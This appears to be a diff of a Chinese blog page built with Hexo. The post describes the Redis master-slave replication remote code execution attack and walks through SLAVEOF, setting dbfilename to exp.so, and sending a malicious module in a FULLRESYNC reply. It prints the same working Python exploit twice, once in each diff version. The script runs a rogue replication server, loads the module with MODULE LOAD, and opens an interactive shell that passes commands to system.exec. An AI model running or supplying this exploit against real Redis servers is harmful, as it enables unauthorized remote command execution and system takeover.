+<li>配置一个我们需要以master身份给slave传输so文件的服务，大致流程如下<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PING 测试连接是否可用</span><br><span class="line">+PONG 告诉slave连接可用</span><br><span class="line">REPLCONF 发送REPLCONF信息，主要是当前实例监听端口</span><br><span class="line">+OK 告诉slave成功接受</span><br><span class="line">REPLCONF 发送REPLCONF capa</span><br><span class="line">+OK 告诉slave成功接受</span><br><span class="line">PSYNC &lt;rundi&gt; &lt;offest&gt; 发送PSYNC</span><br></pre></td></tr></tbody></table></figure>
+</li>
 </ul>
+<p>如下图所示：</p>
 <figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
@@ -544,101 +437,17 @@ PSYNC &lt;rundi&gt; &lt;offest&gt; 发送PSYNC
 <ul>
 <li>将要攻击的redis服务器设置成我们的slave</li>
 </ul>
-<pre><code>SLAVEOF ip port
-</code></pre><ul>
+<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SLAVEOF ip port</span><br></pre></td></tr></tbody></table></figure>
+<ul>
 <li>设置RDB文件<br>PS:这里注意以下exp.so是不能包含路径的，如果需要设置成其它目录请用<code>config set dir path</code></li>
 </ul>
-<pre><code>config set dbfilename exp.so
-</code></pre><ul>
-<li>告诉slave使用全量复制并从我们配置的Rouge Server接收module<pre><code>+FULLRESYNC &lt;runid&gt; &lt;offest&gt;\r\n$&lt;len(payload)&gt;\r\n&lt;payload&gt;
-</code></pre>PS：其中<code>&lt;runid&gt;</code>无要求，不过长度一般为40，<code>&lt;offest&gt;</code>一般设置为1</li>
+<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">config set dbfilename exp.so</span><br></pre></td></tr></tbody></table></figure>
+<ul>
+<li>告诉slave使用全量复制并从我们配置的Rouge Server接收module<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+FULLRESYNC &lt;runid&gt; &lt;offest&gt;\r\n$&lt;len(payload)&gt;\r\n&lt;payload&gt;</span><br></pre></td></tr></tbody></table></figure>
+</li>
 </ul>
-<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>贴一下exp，写得比较丑，为了节省文章的篇幅其它功能我就没有加上去了，有需要的师傅可以自行添加=。=</p>
-<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> socket
-<span class="token keyword">import</span> time
-
-CRLF<span class="token operator">=</span><span class="token string">"\r\n"</span>
-payload<span class="token operator">=</span>open<span class="token punctuation">(</span><span class="token string">"exp.so"</span><span class="token punctuation">,</span><span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
-exp_filename<span class="token operator">=</span><span class="token string">"exp.so"</span>
-
-<span class="token keyword">def</span> <span class="token function">redis_format</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    <span class="token keyword">global</span> CRLF
-    <span class="token keyword">global</span> payload
-    redis_arr<span class="token operator">=</span>arr<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span>
-    cmd<span class="token operator">=</span><span class="token string">""</span>
-    cmd<span class="token operator">+=</span><span class="token string">"*"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>len<span class="token punctuation">(</span>redis_arr<span class="token punctuation">)</span><span class="token punctuation">)</span>
-    <span class="token keyword">for</span> x <span class="token keyword">in</span> redis_arr<span class="token punctuation">:</span>
-        cmd<span class="token operator">+=</span>CRLF<span class="token operator">+</span><span class="token string">"$"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>len<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>CRLF<span class="token operator">+</span>x
-    cmd<span class="token operator">+=</span>CRLF
-    <span class="token keyword">return</span> cmd
-
-<span class="token keyword">def</span> <span class="token function">redis_connect</span><span class="token punctuation">(</span>rhost<span class="token punctuation">,</span>rport<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    sock<span class="token operator">=</span>socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span><span class="token punctuation">)</span>
-    sock<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>rhost<span class="token punctuation">,</span>rport<span class="token punctuation">)</span><span class="token punctuation">)</span>
-    <span class="token keyword">return</span> sock
-
-<span class="token keyword">def</span> <span class="token function">send</span><span class="token punctuation">(</span>sock<span class="token punctuation">,</span>cmd<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    sock<span class="token punctuation">.</span>send<span class="token punctuation">(</span>redis_format<span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">)</span>
-    <span class="token keyword">print</span><span class="token punctuation">(</span>sock<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-
-<span class="token keyword">def</span> <span class="token function">interact_shell</span><span class="token punctuation">(</span>sock<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    flag<span class="token operator">=</span><span class="token boolean">True</span>
-    <span class="token keyword">try</span><span class="token punctuation">:</span>
-        <span class="token keyword">while</span> flag<span class="token punctuation">:</span>
-            shell<span class="token operator">=</span>raw_input<span class="token punctuation">(</span><span class="token string">"\033[1;32;40m[*]\033[0m "</span><span class="token punctuation">)</span>
-            shell<span class="token operator">=</span>shell<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span><span class="token string">"${IFS}"</span><span class="token punctuation">)</span>
-            <span class="token keyword">if</span> shell<span class="token operator">==</span><span class="token string">"exit"</span> <span class="token operator">or</span> shell<span class="token operator">==</span><span class="token string">"quit"</span><span class="token punctuation">:</span>
-                flag<span class="token operator">=</span><span class="token boolean">False</span>
-            <span class="token keyword">else</span><span class="token punctuation">:</span>
-                send<span class="token punctuation">(</span>sock<span class="token punctuation">,</span><span class="token string">"system.exec {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>shell<span class="token punctuation">)</span><span class="token punctuation">)</span>
-    <span class="token keyword">except</span> KeyboardInterrupt<span class="token punctuation">:</span>
-        <span class="token keyword">return</span>
-
-
-<span class="token keyword">def</span> <span class="token function">RogueServer</span><span class="token punctuation">(</span>lport<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    <span class="token keyword">global</span> CRLF
-    <span class="token keyword">global</span> payload
-    flag<span class="token operator">=</span><span class="token boolean">True</span>
-    result<span class="token operator">=</span><span class="token string">""</span>
-    sock<span class="token operator">=</span>socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span><span class="token punctuation">)</span>
-    sock<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span>lport<span class="token punctuation">)</span><span class="token punctuation">)</span>
-    sock<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>
-    clientSock<span class="token punctuation">,</span> address <span class="token operator">=</span> sock<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span>
-    <span class="token keyword">while</span> flag<span class="token punctuation">:</span>
-        data <span class="token operator">=</span> clientSock<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
-        <span class="token keyword">if</span> <span class="token string">"PING"</span> <span class="token keyword">in</span> data<span class="token punctuation">:</span>
-            result<span class="token operator">=</span><span class="token string">"+PONG"</span><span class="token operator">+</span>CRLF
-            clientSock<span class="token punctuation">.</span>send<span class="token punctuation">(</span>result<span class="token punctuation">)</span>
-            flag<span class="token operator">=</span><span class="token boolean">True</span>
-        <span class="token keyword">elif</span> <span class="token string">"REPLCONF"</span> <span class="token keyword">in</span> data<span class="token punctuation">:</span>
-            result<span class="token operator">=</span><span class="token string">"+OK"</span><span class="token operator">+</span>CRLF
-            clientSock<span class="token punctuation">.</span>send<span class="token punctuation">(</span>result<span class="token punctuation">)</span>
-            flag<span class="token operator">=</span><span class="token boolean">True</span>
-        <span class="token keyword">elif</span> <span class="token string">"PSYNC"</span> <span class="token keyword">in</span> data <span class="token operator">or</span> <span class="token string">"SYNC"</span> <span class="token keyword">in</span> data<span class="token punctuation">:</span>
-            result <span class="token operator">=</span> <span class="token string">"+FULLRESYNC "</span> <span class="token operator">+</span> <span class="token string">"a"</span> <span class="token operator">*</span> <span class="token number">40</span> <span class="token operator">+</span> <span class="token string">" 1"</span> <span class="token operator">+</span> CRLF
-            result <span class="token operator">+=</span> <span class="token string">"$"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>len<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> CRLF
-            result <span class="token operator">=</span> result<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>
-            result <span class="token operator">+=</span> payload
-            result <span class="token operator">+=</span> CRLF
-            clientSock<span class="token punctuation">.</span>send<span class="token punctuation">(</span>result<span class="token punctuation">)</span>
-            flag<span class="token operator">=</span><span class="token boolean">False</span>
-
-<span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>
-    lhost<span class="token operator">=</span><span class="token string">"192.168.163.132"</span>
-    lport<span class="token operator">=</span><span class="token number">6666</span>
-    rhost<span class="token operator">=</span><span class="token string">"192.168.163.128"</span>
-    rport<span class="token operator">=</span><span class="token number">6379</span>
-    passwd<span class="token operator">=</span><span class="token string">""</span>
-    redis_sock<span class="token operator">=</span>redis_connect<span class="token punctuation">(</span>rhost<span class="token punctuation">,</span>rport<span class="token punctuation">)</span>
-    <span class="token keyword">if</span> passwd<span class="token punctuation">:</span>
-        send<span class="token punctuation">(</span>redis_sock<span class="token punctuation">,</span><span class="token string">"AUTH {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>passwd<span class="token punctuation">)</span><span class="token punctuation">)</span>
-    send<span class="token punctuation">(</span>redis_sock<span class="token punctuation">,</span><span class="token string">"SLAVEOF {} {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>lhost<span class="token punctuation">,</span>lport<span class="token punctuation">)</span><span class="token punctuation">)</span>
-    send<span class="token punctuation">(</span>redis_sock<span class="token punctuation">,</span><span class="token string">"config set dbfilename {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>exp_filename<span class="token punctuation">)</span><span class="token punctuation">)</span>
-    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
-    RogueServer<span class="token punctuation">(</span>lport<span class="token punctuation">)</span>
-    send<span class="token punctuation">(</span>redis_sock<span class="token punctuation">,</span><span class="token string">"MODULE LOAD ./{}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>exp_filename<span class="token punctuation">)</span><span class="token punctuation">)</span>
-    interact_shell<span class="token punctuation">(</span>redis_sock<span class="token punctuation">)</span>
-</code></pre>
+<p>PS：其中<code>&lt;runid&gt;</code>无要求，不过长度一般为40，<code>&lt;offest&gt;</code>一般设置为1</p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>贴一下exp，写得比较丑，为了节省文章的篇幅其它功能我就没有加上去了，有需要的师傅可以自行添加=。=<br></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">CRLF=<span class="string">"\r\n"</span></span><br><span class="line">payload=open(<span class="string">"exp.so"</span>,<span class="string">"rb"</span>).read()</span><br><span class="line">exp_filename=<span class="string">"exp.so"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">redis_format</span><span class="params">(arr)</span>:</span></span><br><span class="line">	<span class="keyword">global</span> CRLF</span><br><span class="line">	<span class="keyword">global</span> payload</span><br><span class="line">	redis_arr=arr.split(<span class="string">" "</span>)</span><br><span class="line">	cmd=<span class="string">""</span></span><br><span class="line">	cmd+=<span class="string">"*"</span>+str(len(redis_arr))</span><br><span class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">		cmd+=CRLF+<span class="string">"$"</span>+str(len(x))+CRLF+x</span><br><span class="line">	cmd+=CRLF</span><br><span class="line">	<span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">redis_connect</span><span class="params">(rhost,rport)</span>:</span></span><br><span class="line">	sock=socket.socket()</span><br><span class="line">	sock.connect((rhost,rport))</span><br><span class="line">	<span class="keyword">return</span> sock</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send</span><span class="params">(sock,cmd)</span>:</span></span><br><span class="line">	sock.send(redis_format(cmd))</span><br><span class="line">	print(sock.recv(<span class="number">1024</span>).decode(<span class="string">"utf-8"</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">interact_shell</span><span class="params">(sock)</span>:</span></span><br><span class="line">	flag=<span class="literal">True</span></span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		<span class="keyword">while</span> flag:</span><br><span class="line">			shell=raw_input(<span class="string">"\033[1;32;40m[*]\033[0m "</span>)</span><br><span class="line">			shell=shell.replace(<span class="string">" "</span>,<span class="string">"${IFS}"</span>)</span><br><span class="line">			<span class="keyword">if</span> shell==<span class="string">"exit"</span> <span class="keyword">or</span> shell==<span class="string">"quit"</span>:</span><br><span class="line">				flag=<span class="literal">False</span></span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				send(sock,<span class="string">"system.exec {}"</span>.format(shell))</span><br><span class="line">	<span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RogueServer</span><span class="params">(lport)</span>:</span></span><br><span class="line">	<span class="keyword">global</span> CRLF</span><br><span class="line">	<span class="keyword">global</span> payload</span><br><span class="line">	flag=<span class="literal">True</span></span><br><span class="line">	result=<span class="string">""</span></span><br><span class="line">	sock=socket.socket()</span><br><span class="line">	sock.bind((<span class="string">"0.0.0.0"</span>,lport))</span><br><span class="line">	sock.listen(<span class="number">10</span>)</span><br><span class="line">	clientSock, address = sock.accept()</span><br><span class="line">	<span class="keyword">while</span> flag:</span><br><span class="line">		data = clientSock.recv(<span class="number">1024</span>)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">"PING"</span> <span class="keyword">in</span> data:</span><br><span class="line">			result=<span class="string">"+PONG"</span>+CRLF</span><br><span class="line">			clientSock.send(result)</span><br><span class="line">			flag=<span class="literal">True</span></span><br><span class="line">		<span class="keyword">elif</span> <span class="string">"REPLCONF"</span> <span class="keyword">in</span> data:</span><br><span class="line">			result=<span class="string">"+OK"</span>+CRLF</span><br><span class="line">			clientSock.send(result)</span><br><span class="line">			flag=<span class="literal">True</span></span><br><span class="line">		<span class="keyword">elif</span> <span class="string">"PSYNC"</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">"SYNC"</span> <span class="keyword">in</span> data:</span><br><span class="line">			result = <span class="string">"+FULLRESYNC "</span> + <span class="string">"a"</span> * <span class="number">40</span> + <span class="string">" 1"</span> + CRLF</span><br><span class="line">			result += <span class="string">"$"</span> + str(len(payload)) + CRLF</span><br><span class="line">			result = result.encode()</span><br><span class="line">			result += payload</span><br><span class="line">			result += CRLF</span><br><span class="line">			clientSock.send(result)</span><br><span class="line">			flag=<span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">	lhost=<span class="string">"192.168.163.132"</span></span><br><span class="line">	lport=<span class="number">6666</span></span><br><span class="line">	rhost=<span class="string">"192.168.163.128"</span></span><br><span class="line">	rport=<span class="number">6379</span></span><br><span class="line">	passwd=<span class="string">""</span></span><br><span class="line">	redis_sock=redis_connect(rhost,rport)</span><br><span class="line">	<span class="keyword">if</span> passwd:</span><br><span class="line">		send(redis_sock,<span class="string">"AUTH {}"</span>.format(passwd))</span><br><span class="line">	send(redis_sock,<span class="string">"SLAVEOF {} {}"</span>.format(lhost,lport))</span><br><span class="line">	send(redis_sock,<span class="string">"config set dbfilename {}"</span>.format(exp_filename))</span><br><span class="line">	time.sleep(<span class="number">2</span>)</span><br><span class="line">	RogueServer(lport)</span><br><span class="line">	send(redis_sock,<span class="string">"MODULE LOAD ./{}"</span>.format(exp_filename))</span><br><span class="line">	interact_shell(redis_sock)</span><br></pre></td></tr></tbody></table></figure><p></p>
 <p>效果图</p>
 <figure class="image-bubble">
                 <div class="img-lightbox">
@@ -792,6 +601,13 @@ exp_filename<span class="token operator">=</span><span class="token string">"exp
 
 
 
+<section class="comments" id="comments">
+    <!-- UY BEGIN -->
+    <div id="uyan_frame"></div>
+    <script src="http://v2.uyan.cc/code/uyan.js?uid=true"></script>
+    <!-- UY END -->
+</section>
+
 
 
 
@@ -858,7 +674,7 @@ exp_filename<span class="token operator">=</span><span class="token string">"exp
         </p>
     </div>
     <div class="bottom">
-        <p><span> &copy; 2015 - 2019</span>
+        <p><span> &copy; 2018 - 2019</span>
             <span>
                 
                 Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
